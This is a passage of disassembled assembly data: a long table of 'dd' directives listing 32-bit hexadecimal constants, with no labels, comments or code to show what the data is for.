		dd 8E452789h, 6BB5FD37h, 0C217013Dh, 79B057C0h,	2905BB7Ch
		dd 87DDDE5Eh, 0BEE08DECh, 0B8B83CADh, 901655Fh,	39EA0046h
		dd 3E6A2B3Eh, 0F5011859h, 0FD05BC1Fh, 0A724054Dh, 876A9C69h
		dd 0B31A3FEEh, 67D05972h, 0AA72E47Ah, 63CDD773h, 3613986Ch
		dd 8788DCC4h, 0D5081C04h, 16C7380Eh, 0D20BE5F3h, 0DBD1FBFCh
		dd 0B6EB9BCFh, 0D1B6F801h, 69BE5676h, 3190F9BFh, 607E6928h
		dd 62EB1950h, 0A426DDE6h, 0AEEF8041h, 4EA86605h, 228AAA1Bh
		dd 0A87A6B5Fh, 684856D3h, 3CCBD5D3h, 87D4E06Eh,	0EBD3C445h
		dd 6B573893h, 5CF80B0Bh, 36AE6320h, 0A96028B2h,	5524669h
		dd 14279DA5h, 7F98C8E9h, 97506595h, 0BBBC5C45h,	0A423B3C3h
		dd 34BA76E9h, 5C5E5198h, 0FDDB6A2Dh, 7611A20Eh,	2EC6936Dh
		dd 97365F90h, 100C8017h, 6371B19Ah, 0EAC6AD37h,	9311EAB5h
		dd 38F90C73h, 0E6D1D86Fh, 0C12349Bh, 0D17B98EEh, 6F20437Dh
		dd 0D808E3CFh, 11F21654h, 6EFA2908h, 0A60F86F0h, 0A0BAFFF6h
		dd 0AE31A93Dh, 0BBC9374Ah, 72DC959Bh, 0B087AD88h, 0A7A54270h
		dd 0A6536BB6h, 5BFA3245h, 30C25B7Dh, 9263E29Dh,	2F01756Ch
		dd 87F3DE13h, 0B6671440h, 9FB60D26h, 0A56887A3h, 6E804CC2h
		dd 4D9DD174h, 71AFB2B4h, 0E7752F8Ch, 0CB6BB54Fh, 53A169C4h
		dd 8BD0ABE3h, 7EA815B8h, 35318F4Fh, 3C7F84A8h, 5AB03134h
		dd 37BED1FAh, 43DBA558h, 0C7E20BE9h, 0DDC3212Dh, 732EC679h
		dd 566EB3B8h, 8C4CA1E6h, 2C1A5749h, 8B022C14h, 124E7716h
		dd 0B02546ECh, 2C4425D6h, 0B9C5249Ch, 0E38F1CA6h, 0B99EA40Dh
		dd 0B47A2DBFh, 0C73374E8h, 89D70CD9h, 0B2351731h, 0E1D57CC3h
		dd 6E7C4CC5h, 9083A592h, 7C77BC2Ch, 949CE1FFh, 808FEADEh
		dd 2BFD3507h, 61F5221Eh, 0B06F52B4h, 0B0A1AD5Eh, 0ABEFB68h
		dd 42C8075Eh, 0B7C33DB6h, 1359534Dh, 0CBCB7E40h, 0CCC77809h
		dd 0D7E0C759h, 9903B783h, 2F2A8EBFh, 63C93BF0h,	0A04B7096h
		dd 8CBC8EB8h, 0DDC7784Fh, 2D7265E3h, 77703F3Dh,	50F043EFh
		dd 0BF5C2232h, 22E7BDD9h, 4232F26Ch, 7653695Ah,	65AEE235h
		dd 0CFE8C787h, 8A4DCC37h, 387B0B68h, 5661FBC5h,	7CD2B4AFh
		dd 33EF0F31h, 3660EA50h, 675EC3BCh, 0FDAF7D39h,	210C2784h
		dd 5F80DDFCh, 4DCC2B74h, 0EEDCA33Ah, 64483635h,	43F1EF15h
		dd 0D588F363h, 53FB0DC2h, 0EE186A91h, 155A5066h, 50C37B80h
		dd 0FE58EA7Ah, 0A8DB60FEh, 334E42F4h, 8FF611EBh, 0DECFF603h
		dd 69051C65h, 45A6310Eh, 472D1B90h, 34AD37DFh, 46604B1Eh
		dd 657476D5h, 0A6115536h, 0B56ECEB5h, 0BE8CF9E2h, 0C4FE71D0h
		dd 0D1B2142Dh, 0B1CD5FC9h, 2506C41Ah, 92ECCBB4h, 80B04E0h
		dd 462AD10Ch, 0BE072FD6h, 0A336AA01h, 0DF90106Fh, 8CF4F6E7h
		dd 0A3DA546Ch, 6DD0922Bh, 1FE23AEBh, 0D7122900h, 0AAF83720h
		dd 0D08637DEh, 7C87C33Eh, 0AA32F477h, 39805342h, 6CA75495h
		dd 3E72BB27h, 8FAD82FEh, 0DAF66FE4h, 54AA66A8h,	24263CF7h
		dd 0A25FCDBBh, 5FA82B65h, 0BED20008h, 7CCD0AB9h, 4864EE55h
		dd 8C5BF705h, 9215DA0Dh, 19770A75h, 0F51E95F9h,	3EEA8BDCh
		dd 26F1759Ch, 6B3BD5E4h, 0F739F984h, 240A66F6h,	0F4AB6BE3h
		dd 0C4AACBC2h, 79C21A96h, 13D5FA25h, 6497847Eh,	0E37FF9C3h
		dd 0DB05FF2Eh, 0C18FE09Bh, 0FEA94B97h, 0F10CD11Ch, 0F12B213Ah
		dd 0D98F3AE3h, 2AF88781h, 1E97913Ch, 7BF77D65h,	7521C637h
		dd 0E7B5CD1Fh, 98D67CF4h, 77E8D5BEh, 0F6858762h, 7F18437Ch
		dd 3E04AE16h, 531D14D8h, 0D734E82Dh, 432BBE8Dh,	75F2FF2Bh
		dd 0EFA6C722h, 0F7E33B0Ch, 0F59E1FAEh, 8080C636h, 0A67FDC2Ah
		dd 14D3349Dh, 0FFF3958Bh, 1CC14039h, 0B0CA6488h, 0EF75C0A1h
		dd 0CB8153CEh, 0AE500DE6h, 629DF52Fh, 0D1CF3225h, 0C5E2D7CDh
		dd 3B76A35Dh, 0A5D41F54h, 4017AC02h, 0C8AC24CBh, 4DA203E3h
		dd 56206C47h, 9FCFC23Eh, 9F99E1F6h, 7E88EA18h, 85D44E7Ah
		dd 49BDD2BEh, 0F2D3EDBAh, 0F7D88FBFh, 0CA4C8B4Bh, 54BE86EDh
		dd 0E2C7C11Ch, 3479E56Ch, 21E8E0F9h, 0E61D3335h, 0B9F09BD4h
		dd 98253EBCh, 0B6D04716h, 4D6E30DCh, 5C8FDF33h,	99D9D70Ch
		dd 0C93A740Ah, 1EA0CAE0h, 880D4990h, 5832A11Ah,	28652379h
		dd 104AF6ACh, 12BEBFCFh, 8AA9621Fh, 49D1CEBDh, 0F3160351h
		dd 0C3977C24h, 0CE3DBE3Eh, 0D6C84EBCh, 8D221615h, 0ED331F01h
		dd 12B61771h, 0F17A9BECh, 9701C4F6h, 83F42805h,	64F5125h
		dd 43459A4Fh, 7863F3B9h, 0BB571CBAh, 56A78351h,	9D3AA120h
		dd 0A1602F1Ah, 6CABA7C1h, 44A3FB14h, 7AE3198h, 0F4BC8BA2h
		dd 0CA8402EAh, 0F29F5B6Ah, 33E998B4h, 799269D0h, 8442210Bh
		dd 0B5B4F87Fh, 0BA21F9A9h, 0A753B739h, 97F183Fh, 0EC19401h
		dd 0B616A457h, 0FF77145Dh, 3C193CFAh, 81AAF04Bh, 4FD1432Bh
		dd 38665D0h, 5E578C71h,	0C2817BEh, 9AA48315h, 11A38BFDh
		dd 0A8670812h, 2B182269h, 55E16DABh, 0BC7C4B44h, 245B2E8Bh
		dd 0CB1DF34Eh, 0F834AE1h, 944E575h, 0FB104C2Ch,	702AFAA0h
		dd 0DA02C314h, 0D3C71ADh, 3C964D77h, 0E8639B70h, 42C4DDA5h
		dd 2F3DF755h, 3960598Bh, 80980497h, 1A1114BCh, 0C2981111h
		dd 997D812Ah, 57A5A579h, 5B16C237h, 1AFE20F8h, 209723CEh
		dd 0F12EA494h, 5AB774Eh, 2BC514A2h, 0FF757BADh,	0EB899E3Eh
		dd 2CE168C0h, 9BC5E30Dh, 0B2D19D6Ch, 72A6D5B0h,	618C0D9Bh
		dd 2E453EFDh, 2C068F7Fh, 7BDC5798h, 5720370Ch, 0EABA75A6h
		dd 0EA511990h, 37559B0Ch, 2DBB485Ch, 1D314FDCh,	0A790D4CDh
		dd 0BD14039Ah, 0E721D30Ah, 0EC167A19h, 4DDA6ADBh, 0B0B23678h
		dd 0A53FE51Ah, 87B39879h, 0FF3550C2h, 3BB07964h, 77E7A3F5h
		dd 0D7AB7300h, 28469689h, 0CE3C72CFh, 0CF6F25A3h, 0B97B16F5h
		dd 21794708h, 30761D28h, 0EA847EFh, 1BB3588Ch, 2AE24D3Eh
		dd 0CE38933Ah, 2956B26Eh, 0AAA8E23Bh, 6FEC9421h, 0BCCB2E52h
		dd 0DB70A456h, 35D4B3Ch, 8E481046h, 553407D0h, 7E7B0AE2h
		dd 1290E456h, 0BC0D3755h, 7F04F671h, 9DA86187h,	7E857C36h
		dd 532AD33Dh, 6CF57533h, 0B5FD16F6h, 8D3D6FE1h,	6D2F7F93h
		dd 0D9CFB30Fh, 3A1A550Eh, 0D2F3D3CDh, 0B4A5FBCCh, 90F79243h
		dd 57A383BCh, 654487DAh, 0B5ECBD6Ch, 1AE168CDh,	30189328h
		dd 0C5BDD895h, 1E7A5F2Fh, 75F261F9h, 0CD12AD61h, 7D1E5E36h
		dd 0B90DA6CBh, 351DF6Bh, 308F73Dh, 0B710D498h, 0CADFD38Ch
		dd 3A1B78D1h, 16CCBA27h, 0A43F8355h, 16DC7653h,	4AA5673Ah
		dd 1D98B0EBh, 2C96BA46h, 6652FC6Eh, 8FE1C1E9h, 23FC4ADCh
		dd 0CBD429D0h, 1B4AB918h
		dd 94AF68F2h, 12361A89h, 0E4C795FFh, 0EDE48122h, 6856C9EEh
		dd 3831D5DDh, 2A388DFCh, 0AFF15B25h, 13FB8F20h,	0C22E98E1h
		dd 20164E75h, 75FF453Bh, 0F27125C7h, 3A709B7Ah,	9FA35F84h
		dd 576796CDh, 0F8EBC604h, 2002D1F9h, 0C2032B4Ah, 2DD5A15Ch
		dd 12AB32F2h, 6C03EC60h, 45297507h, 0FA741C36h,	83227619h
		dd 6B586404h, 25F215EEh, 0B864FEAEh, 0E1C7A42Ch, 9C698A6Ah
		dd 0CC388329h, 0E0041F49h, 2D30AB29h, 795F757Dh, 0B1FBB022h
		dd 69DD9BEBh, 0FDA28BE7h, 870043C4h, 40B757C0h,	9A31C9A5h
		dd 7FECFF49h, 497EB3B2h, 2EE51D0h, 0E59379CFh, 4B280C40h
		dd 629AC9E4h, 9E505C53h, 27384D00h, 0E06D639Bh,	0C618F94h
		dd 3C027A9Dh, 38944434h, 1F92A522h, 2D99D8C3h, 5E856B5Ah
		dd 5B066C77h, 12D16B78h, 0BBFF3247h, 0BAA56F1Eh, 8297BF7Ch
		dd 347231D8h, 496CAF2Eh, 0B684C76Ch, 0AC61165Ch, 73A7BE69h
		dd 0E25F400Bh, 0CDE64256h, 1D13761Bh, 5E561421h, 0BB0BBD78h
		dd 3AA6DDECh, 3E3090D4h, 0F2A6971Bh, 0E9327B6Ah, 0F27930FAh
		dd 13FD9A7Dh, 0DBCA403h, 1AA6F5F9h, 7862CCC1h, 5EBACFAEh
		dd 0EF9AA8EEh, 991D5CC5h, 520830D3h, 8A16F131h,	0BF8A1F45h
		dd 2D794990h, 0EB3B4310h, 0A097A2C5h, 76BF7D62h, 0B6CDF39Dh
		dd 0DDAE8E52h, 7CF5F682h, 176089ACh, 34D5DAC6h,	862FA230h
		dd 2C340399h, 931DC0FDh, 3E4389DAh, 4CB2199Eh, 0B100342Eh
		dd 646A0BB4h, 7CE5800h,	3BDACE21h, 0DD45F495h, 6A753724h
		dd 0A82B0BDCh, 5622D117h, 57D1A6C7h, 845E5D6Eh,	77204067h
		dd 0EC3D4FCCh, 4720488h, 0DCB54D18h, 8805BA8Eh,	70CF5122h
		dd 0B96054D4h, 5CA6FD14h, 372530A6h, 0A2F95CC0h, 9E1FC24Bh
		dd 6BBEF90Dh, 39D86F6Dh, 0BB49C1BAh, 19B1517Dh,	12A047B7h
		dd 7E40D35Eh, 0D60CB3F8h, 0DE5B0C50h, 0A8BBF3h,	0ABAF8CE2h
		dd 718AFEE8h, 9323AB99h, 39FEE5D9h, 0D4C992F2h,	8385B12h
		dd 0DAA9F3F4h, 0C6AFB7BDh, 0E7E771Dh, 0F03B6A91h, 208BB43h
		dd 0BB33C5EFh, 4C0EBE4h, 86DCE025h, 2BCA37C0h, 9C4B674Ah
		dd 3C1B4194h, 7A72883Ch, 0D0295B6Fh, 0E5E17988h, 5F87CBD4h
		dd 5C9FDB3Ah, 0B247611Eh, 8CDCBCF9h, 9F1A3A42h,	71593004h
		dd 937D6F0Fh, 0CC330D75h, 73206F18h, 3C1A33BFh,	529D56A9h
		dd 7758945Ah, 0EFF78C7Eh, 0A06B7D77h, 8DA40035h, 0D2D038BCh
		dd 11F07003h, 6406B20Fh, 0D01E456h, 0C38A2243h,	9C67C82Ch
		dd 0D4A6883h, 7910481Dh, 0F8B646C9h, 6D8DECE3h,	320DF1BFh
		dd 7B301CC7h, 8FCAC23Fh, 0EB124389h, 478C04D9h,	281906B9h
		dd 22703DFFh, 6E166808h, 0D9ECBC85h, 7900E1FAh,	89AB6BF9h
		dd 0F290D115h, 0DE110C18h, 795776CFh, 0A1292340h, 0C9D4ED6h
		dd 0C18E1F7Eh, 8B1A086Bh, 6B1D0F58h, 9106C263h,	0F6298341h
		dd 52E5D189h, 0BAFBA03h, 88BE86B9h, 0FC4EA096h,	75BBA9F8h
		dd 1A837178h, 0A578CDE9h, 53BF6442h, 0D04BD629h, 11FC93BFh
		dd 0C5AB468Eh, 263A6AB6h, 0B6EB924Eh, 8ED74AEBh, 210322E1h
		dd 78FB3A7h, 77857002h,	115B915Ch, 6CC0BB92h, 0EE232D9Ch
		dd 0AE6B9DE5h, 3AAB99A0h, 0C9C22A0Ch, 0DA3E6AD6h, 0B2875B72h
		dd 412C9B48h, 0B30A76F4h, 927204Dh, 0FB8209B0h,	62C52755h
		dd 0D4F8DA73h, 89D8C2C7h, 0D8513FA9h, 4D2616F0h, 19582991h
		dd 0AFB44CA3h, 9A0BED6h, 8C76A8FEh, 8B0D5295h, 62094D8h
		dd 28F1E3ACh, 4ECC206Eh, 0C530B27Ah, 57227B25h,	85BE71DDh
		dd 7F8E487Ch, 13A5C293h, 0BAAF29E0h, 83A86EF4h,	0D200616Dh
		dd 5FA3025Dh, 0D4120064h, 8EBA17D7h, 0CB5C7054h, 0DDC18D1Dh
		dd 0D5582B9Fh, 1FE914EFh, 0D341A780h, 0ACBA853Fh, 7140E2Dh
		dd 220E6049h, 0C8084231h, 69E086CCh, 6ACCA21Ah,	0ED221A21h
		dd 2687518Ch, 2CCB1979h, 0D7DD5F9Bh, 0FA3A9820h, 492113CFh
		dd 541FA64Bh, 414C54FDh, 6FD6AD32h, 0B4AA2D2Fh,	644DE431h
		dd 41B35CF5h, 9F193191h, 8BC17A7Ch, 0C71A10ECh,	0C44743DEh
		dd 9430B341h, 88A71029h, 0ED2F5DF6h, 4C612312h,	90D31A32h
		dd 0BFF80674h, 2487EC3Dh, 0E2C88AEDh, 0CBFD85Ch, 0FEABB8E8h
		dd 0A03FEE55h, 0C513BC7h, 0E905B741h, 0A30A1D38h, 735AA008h
		dd 1D425820h, 0A48AF1ACh, 27AB23FBh, 455EF179h,	0E953BE47h
		dd 843CC78Ch, 2CD27680h, 0FB5BC181h, 8A4841C1h,	9742D2CCh
		dd 7854E326h, 841F6BCBh, 7E4A14D8h, 9C6F445Dh, 881A215Ah
		dd 0E22BDA77h, 45AC04DAh, 454B1B8Dh, 0A5DDFD41h, 0E973D890h
		dd 0D859ED2h, 0BEFB0923h, 0BB3A7D41h, 42B82611h, 7A33FF7Bh
		dd 0C6CC53Eh, 472DA458h, 289DF586h, 7DAF0043h, 80357D5h
		dd 0F732BF66h, 1A5C21CBh, 92722DE8h, 6638171h, 0ADA9840Ch
		dd 2EFF115Ah, 7E904469h, 0B6232A4Dh, 0F57EEA01h, 63563BC7h
		dd 0BB6818Ch, 2F4DFE99h, 0F812D7FAh, 46975F09h,	593BECEEh
		dd 0B46AC500h, 597E2E8Bh, 89ACDBC6h, 7AC812Bh, 16C44CC5h
		dd 0B7D169E4h, 19CC3861h, 247A6C1Dh, 90A01AA9h,	64D8AFF9h
		dd 946C908h, 5AADD1C8h,	9ED2D1F4h, 54C48F47h, 4C364BCh
		dd 89C8F0CCh, 0A96BBCD9h, 0C34A02FFh, 0D4BB5364h, 972A9210h
		dd 34FA7D59h, 51C51047h, 52614373h, 0A3F2BF18h,	7C402554h
		dd 0E54613Fh, 7F3428A8h, 80B31C0Dh, 548B3386h, 0B21713C3h
		dd 62D6E671h, 459C0071h, 0A556F904h, 85FBE4ECh,	0AE43B0B2h
		dd 9851AA8Fh, 0B306409Fh, 0A734B1E3h, 1F7F377Ah, 80D0639Ch
		dd 5FA1B193h, 396A733h,	2B4FEA38h, 89141A1Bh, 6D25DC8Ch
		dd 0D2B791E7h, 3A42971Fh, 47D2FABCh, 307DDB25h,	6B60C2Bh
		dd 2F032B29h, 23203DD8h, 897B4637h, 293E7C5Dh, 0BDC8DC52h
		dd 0F70CBD2h, 4FB217A2h, 0C2985577h, 562B0743h,	39F91CEFh
		dd 0F61DCA28h, 0A5471B19h, 36DCA6ABh, 0B3070DD6h, 34ED2D5Ah
		dd 1149CB48h, 0F4652795h, 0BE88B0A6h, 440CFF30h, 5EFF00FAh
		dd 3ED9871h, 7F8D4C49h,	5CB2399Bh, 5E59E632h, 309EB3F9h
		dd 0FAD720Fh, 80EB87FAh, 41D537B2h, 0FA1610FFh,	225D3E3Bh
		dd 4F2012D0h, 0D51DFC6Bh, 0B0A5DFFh, 385AC1E8h,	3D8F6AD7h
		dd 0E6E94999h, 3E280A09h, 0FB693A42h, 1DC3F721h, 11644A72h
		dd 4C2923Ch, 4628B7CFh,	10007DD2h, 0B77119CBh, 95DC0128h
		dd 0C65D7815h, 61655E82h, 0BBFFAEFCh, 12113303h, 626BAD88h
		dd 2744E6F9h, 3D940AECh, 0A628945Eh, 0F1D03D5Ah, 0F7B7B2DCh
		dd 0E3F127B8h, 6E1E6039h, 0B82B7BA8h, 0CBD197A2h, 0EC821FC3h
		dd 28B72ACh, 8F167071h,	5C34206Fh, 152EEB1Ch, 0C777CE45h
		dd 1D80D80Ah, 0F0CAE577h, 3636D198h, 11AFE818h,	8F8A820Fh
		dd 0B941C35Eh, 1BE293BCh, 4D67E60h, 3B1E0A72h, 0E298647Bh
		dd 8DDC917Eh, 0A780E181h, 0EFCA4C6Bh, 5083CDC2h, 0F178757Ah
		dd 94AADB96h, 62C46543h, 66B2556Ch, 5A28B53Fh, 0DD513828h
		dd 0A606CF08h, 0EC65F03Fh, 7EB34C7Dh, 106CE2A4h, 0D0BCBC8Bh
		dd 0DFD553A3h, 35698DB1h, 452748C2h, 8F1F071Dh,	6F02E87Ah
		dd 37900C7Bh, 0FA71BB33h, 0A44482EEh, 5F78FF39h, 0B797DA25h
		dd 0FE12D38Dh, 0E68A69A4h, 0CFE9F373h, 2E1D430Ah, 0A93BDB1h
		dd 40CE0F8Ch, 88C50C5Eh, 0D050454Ch, 28ECB87Bh,	13F6FBF3h
		dd 9E7721DCh, 0B1869F83h, 0BBE28F44h, 0BAD2BAE2h, 0C4A94861h
		dd 0F2AAD90Fh, 41255795h, 375C2554h, 56D061A0h,	95545E1Dh
		dd 0CFB7BE8Eh, 591C622h, 98FA48FEh, 82171CCDh, 7190CD51h
		dd 372DFD88h, 619CBFA0h
		dd 0EA439C89h, 95E33E20h, 2CF22990h, 259D7CA9h,	55208412h
		dd 0C95EDB6h, 1D03F81Fh, 85A4CFC7h, 18467E39h, 0B9B467E1h
		dd 9086B98Ch, 32AC3E8Bh, 57781B60h, 8EAF8A4h, 2B6EB469h
		dd 1C2946D5h, 3DC2FB83h, 0F3E7CAACh, 0BB6F0C83h, 7F3AB6EBh
		dd 26FD6E49h, 0EC3784F9h, 88D231D4h, 0F54D787Eh, 67AC7B19h
		dd 62F8588Ah, 0AC1D183h, 8696C2C1h, 2F2B174Fh, 8F050BB3h
		dd 0B3E11D54h, 0BFB44E06h, 96EB2BD3h, 0DC4023F2h, 9FAE364Ch
		dd 4FD9AB6Ch, 51975466h, 9065133Eh, 66DB9A11h, 1EB5A8C7h
		dd 0A0BD7C61h, 0DA0E3E3Ch, 0E96345D6h, 22275BC8h, 0DD5E5F80h
		dd 74CD9A8Dh, 0E3AFA8AFh, 0CB364D04h, 2AE5D138h, 0E210D20Eh
		dd 0C2C9B659h, 52B4780Fh, 0D07E7E83h, 0AC08E529h, 5191C4E4h
		dd 3FA5E702h, 0FFAFB837h, 0ECF4F591h, 7C5A06F4h, 888DA45Dh
		dd 71D190Fh, 37E91631h,	85F301Ah, 3B522F08h, 0E405A78Eh
		dd 5CA82097h, 0B5AECE14h, 0A584979h, 8099F638h,	0BC6FBCD7h
		dd 2322824Ah, 0E94E41E5h, 0C46B4AC9h, 931A41D7h, 1FD94471h
		dd 0C6E8CDFEh, 0D27AEF85h, 9CF311B0h, 44EC679h,	9B6B7842h
		dd 0FE1AC128h, 0DBC0A9E5h, 9AFAB991h, 0C3245A00h, 0E4704D74h
		dd 518CB18h, 8D3366CFh,	991841EDh, 0B601B2A8h, 0B0E9474Fh
		dd 0EE4C5C1Ah, 3B89C1EAh, 0F19B6CBFh, 0BE1085F2h, 47F59B21h
		dd 0D915A606h, 98BA84F5h, 80B436D4h, 29A20268h,	2A6BF2BEh
		dd 95DAA3Fh, 46832F15h,	650709F7h, 35A785A2h, 0A7A3BF1Ah
		dd 0DF824ABh, 74E70A43h, 8157F68Ch, 30E252EFh, 4D7A5F1Dh
		dd 6FE6F904h, 6F43BECDh, 82CD9262h, 51235080h, 81BBFF2Dh
		dd 0BB32BFECh, 0BB8CAB58h, 804CE267h, 32E390EDh, 0FF550F36h
		dd 45F913A8h, 0A4AB42E8h, 0D66A8553h, 536B2834h, 6AB6445h
		dd 0C07DCA78h, 79308F02h, 0B6C1D649h, 0A361088Dh, 1AA5C50Eh
		dd 0A733EBE0h, 0CEC7BC43h, 5C2303DCh, 0A4B5487Ch, 218831AEh
		dd 9ED306C7h, 0BA7C9EE0h, 936AF70Ah, 71078C18h,	4252DDFFh
		dd 0A9F1E3C3h, 0DB2F06BCh, 18C49D77h, 0A90C5E22h, 85D05041h
		dd 0BD0D8E85h, 0DBE453A2h, 19EF6A4Bh, 75B9144Ah, 0B92229D0h
		dd 8F41DBE6h, 46C10F1Bh, 0F250F97Ch, 2789A8F1h,	0F814CD33h
		dd 896F9761h, 367186DDh, 0BFA9CD4Dh, 0F6D5E756h, 0FFC0B473h
		dd 0C50C3C5Eh, 7B540E15h, 2C93DE49h, 81C06DC3h,	0E463578Eh
		dd 0FF25BD0Dh, 16540FCh, 0D693D59Fh, 495886C3h,	3F6071B3h
		dd 0E61CE7Eh, 0BA60BEBFh, 0E3EB5676h, 643765ACh, 6FFA063Fh
		dd 0CB5998A0h, 6FB58C24h, 1F13FB07h, 4C8C9E1Fh,	5E03495Ah
		dd 23782EA3h, 9BB67008h, 905E3E64h, 788F860Ch, 5FA1436Bh
		dd 617F20ECh, 0F546C6E5h, 6FF8D919h, 6B33C945h,	0A33B18C3h
		dd 0D56C0E76h, 457AED47h, 0E6239021h, 0C4FC379Ah, 0B36F1434h
		dd 838767ABh, 0E678D75Ah, 59E89A4Ah, 0D2A00F9Ch, 34FE475Dh
		dd 69569305h, 2F40285Dh, 21D7DD6Eh, 483BC9B8h, 6D7AF4B5h
		dd 0F21C72B4h, 0A07677C3h, 6417EFE6h, 0EED04163h, 0D62421A2h
		dd 0E84D257Eh, 0ECFE1F2Dh, 0A31090E2h, 7DAA12A8h, 0DFD704A2h
		dd 0DE32198Ch, 0B862CD1Ah, 389F63B3h, 33E73857h, 784D5230h
		dd 189BE82Eh, 4FB91621h, 0B3D60150h, 97BC8D22h,	0B4D3105Dh
		dd 989CE5A2h, 2AC1F3A4h, 0F9386EC4h, 25235E5Ah,	7B812920h
		dd 8959FB8Ch, 0B793B05Ch, 3E6C6E27h, 0FB644F5Bh, 4D15AE42h
		dd 8C4141A7h, 0CCCC319Ah, 177556F8h, 48974579h,	2BBD583Bh
		dd 0B54E2C00h, 0F2D3BDFBh, 0AFB55B68h, 824A3B14h, 3A435883h
		dd 21F837FAh, 5A2BCEC4h, 102113C3h, 9A8AE029h, 54FEA7F5h
		dd 70E99EFEh, 0E2FC5D61h, 86BEAF2Bh, 7927BCD6h,	704E833Ah
		dd 0E19AC4D7h, 0BA367069h, 0BD65F27Ah, 5F6776E5h, 0C0F9503Fh
		dd 0F421DDBAh, 43BF273Fh, 0D10A4C3Dh, 9476BDF5h, 0D4BAD96Ch
		dd 7B769362h, 0E8586EFCh, 4739D093h, 0FEEC651Ah, 0B1892071h
		dd 5C15CE6Eh, 6F3369BAh, 785109A5h, 86C2F00h, 0B2A51F15h
		dd 668A6C4Fh, 2DC30B2Eh, 0A974EC20h, 542DB542h,	0ECF5D0E5h
		dd 68376625h, 59F9F7A5h, 210A6055h, 0F03A5A55h,	54E20723h
		dd 27AD8F4Ch, 711A20E0h, 55B7215Dh, 152255F8h, 0C70C6A5Ah
		dd 56CAC9Dh, 0B09269F3h, 0CE63FAEh, 0C6113684h,	2A5E5748h
		dd 1EC10AD1h, 0CA262CC9h, 0CE87877h, 99927E12h,	0CC98655Eh
		dd 0E11DF3A1h, 0A0F2AFC1h, 67E0454Bh, 84328473h, 939B5D62h
		dd 0C4B0E100h, 4F30A40Fh, 0EAA0531Dh, 0D6577B11h, 0B8E78C7Ah
		dd 3FC916F5h, 225AD593h, 0A35BBDA1h, 6876A8B0h,	8C80FB25h
		dd 0E5BCE9B6h, 7F34BCA1h, 0E4BBEF88h, 783AFD19h, 55CBE818h
		dd 671E2843h, 6EB4E82Bh, 86CBF831h, 0DFA03DBBh,	0E5FFD625h
		dd 9D3B0D37h, 2DA515DBh, 0FD6F30CAh, 0BC172BD0h, 1223A39Ah
		dd 4CC7D50Ch, 94F068A7h, 9CC84502h, 0B9C25F17h,	0FE0C62F8h
		dd 39DA23C4h, 2AFFA799h, 0BB9F2FA5h, 7C8DAAD4h,	8FA6D836h
		dd 0CD4A6AEBh, 2E4E5B43h, 58707D32h, 1A93883h, 820D8433h
		dd 59AE6BDFh, 0D1C79CD9h, 42287FC2h, 45ED1979h,	735A2F42h
		dd 9035C386h, 0F1C8426Eh, 0DB17F89Bh, 75B6F16Ah, 0AB1E2457h
		dd 0FF51AEFEh, 0EF2E6AF5h, 0F2342774h, 44AFA53Bh, 50B43A56h
		dd 525E8F3Eh, 0AFC3E896h, 843CDBF8h, 0DD34691h,	0C9F58519h
		dd 18EC1407h, 420560D5h, 8A804E37h, 0D54DF999h,	95AD5654h
		dd 3A74AD48h, 9C4584Ch,	9889C9FBh, 302EDE79h, 1A72627Bh
		dd 1CF9C3EBh, 6064719Eh, 0F98E036Dh, 0B37A172Eh, 93836D10h
		dd 0F82AE388h, 0A80E190Bh, 347CD351h, 620DB0D5h, 329475BEh
		dd 0C05BAAC3h, 242890EAh, 52013127h, 0F7759F67h, 2E891C36h
		dd 2B13362Ch, 0D9FF806Eh, 0B082CC2Dh, 39821698h, 0EF09F6h
		dd 377CBBB7h, 189336EBh, 0A1233ED6h, 22A90AF0h,	3133A4E2h
		dd 6D86C6EBh, 0E4B34F5Bh, 0F792E6D8h, 0DC6FE49Bh, 0B37CAD6Fh
		dd 0DB291778h, 0A4E6F3C4h, 0ED1C5071h, 297C2440h, 9B086633h
		dd 0B500E32Ah, 31A39213h, 0BE6CD9h, 0C191CD41h,	69A4E671h
		dd 2458CB22h, 3AB9B02Fh, 1361DEB3h, 9B381D79h, 5C3093BFh
		dd 3B5D618Dh, 0B749D47Ah, 0D76A57C8h, 15F0F84Eh, 6FDC947h
		dd 0DA098F67h, 22763AE3h, 640B5357h, 0C6B6FDD1h, 784D30E9h
		dd 7EEA3D84h, 1BDA3FBh,	9AC2F318h, 4F8B72B3h, 31C92A87h
		dd 4FD8FC34h, 33350518h, 32B44CA5h, 171A1BF6h, 0AE7B302h
		dd 0DDDD270Ch, 61D8F502h, 0EF337CC2h, 0E92CA00Ch, 7E72B5C5h
		dd 0B9A16EEh, 5E8EC9EFh, 2F0CE8F1h, 63A039A1h, 0C4232D51h
		dd 0CD5FC8E4h, 366B4E2Ah, 232BDF79h, 2AD38001h,	3D96B814h
		dd 0CC1804D0h, 0C28660AFh, 2FF5D98Bh, 61D66C3Fh, 9DAC15C7h
		dd 3CE6ED8Dh, 2F29DF2Ch, 5515A4FCh, 0BC3B73B6h,	87853FE8h
		dd 0C3ADFF1Ch, 0C889AD57h, 0BDE11DD2h, 63955D88h, 0FD6B5A10h
		dd 0D5A7F119h, 3EDDBE7Eh, 0F916B675h, 0BCE36C61h, 0AEF5ED08h
		dd 0ACCCC3C6h, 362B73A2h, 7ECAD30h, 1F19D07Eh, 0A1F26198h
		dd 2A90EE76h, 0CF36EF2Eh, 59C96375h, 919F1BFBh,	1F2AF5Dh
		dd 5F7F13D6h, 23C9FBB0h, 34E3E831h, 3329B0BAh, 0ACF5E8B2h
		dd 7ACD6C2h, 0CBDD0B33h, 880B5CC8h, 0B6CAA649h,	7AF57B33h
		dd 0BEE7A6B5h, 0D6D53677h, 0A7C0D907h, 0D9C6BD0Bh, 7184B0CDh
		dd 970109D2h, 2269B3C4h, 9277DADEh, 0D7753110h,	0A1E10B12h
		dd 80B468ADh, 925AC7CDh, 5B3BA0B7h, 0C5299378h,	0FF77180Eh
		dd 9E579860h, 0E3BB9DD7h
		dd 5CEC8444h, 0AA314E66h, 88355691h, 0C070332Ah, 0E055C3DFh
		dd 0DEAA1EF8h, 0F21B7BA9h, 0EBE5F96Ch, 0C9492902h, 7E2AD0D6h
		dd 5D0BD91Fh, 5131A42Dh, 0BFB3D93Ah, 0E26DF22Eh, 0AAF46676h
		dd 6AE229Eh, 0EE702C93h, 277C7584h, 0FB74B55h, 6A41F8A9h
		dd 942522AAh, 76094E90h, 0CDA652DFh, 9BC0830Bh,	0CD3CBD82h
		dd 47F5C140h, 0ED2812F8h, 2F792F98h, 0DCAF8983h, 0EA7C6563h
		dd 181C93D2h, 5901FBDAh, 0E25A1391h, 0EC8DF9EFh, 7928B589h
